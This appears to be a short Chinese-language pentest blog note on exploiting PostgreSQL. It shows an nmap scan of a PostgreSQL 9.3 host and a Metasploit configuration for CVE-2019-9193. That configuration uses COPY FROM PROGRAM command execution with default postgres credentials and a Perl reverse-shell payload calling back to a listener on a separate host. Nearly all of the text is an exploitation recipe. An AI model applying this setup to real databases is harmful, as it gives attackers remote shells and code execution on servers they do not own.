---
title: PostgreSQL
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2020-12-21 16:02:17
top:
tags:
layout:
---
编写进度
- [x] 


**PostgreSQL** 是目前功能最强大、特性最丰富和结构最复杂的开源数据库管理系统，是主流数据库中最符合SQL标准规范的实现。  
PostgreSQL 的性能非常优秀，并且在极限压力的情况下依旧能保持稳定的性能。

## Information
```zsh
nmap -Pn -sV -p5432 10.199.39.1
Host is up (0.057s latency).

PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 9.3.0 - 9.3.2
Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds
```

## PostgreSQL任意代码执行 CVE-2019-9193
存在版本：PostgreSQL> = 9.3

```zsh 
Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DATABASE           template1        yes       The database to authenticate against
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS             10.199.39.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              5432             yes       The target port (TCP)
   TABLENAME          YpVFJRRcUZ       yes       A table name that does not exist (To avoid deletion)
   USERNAME           postgres         yes       The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   ```






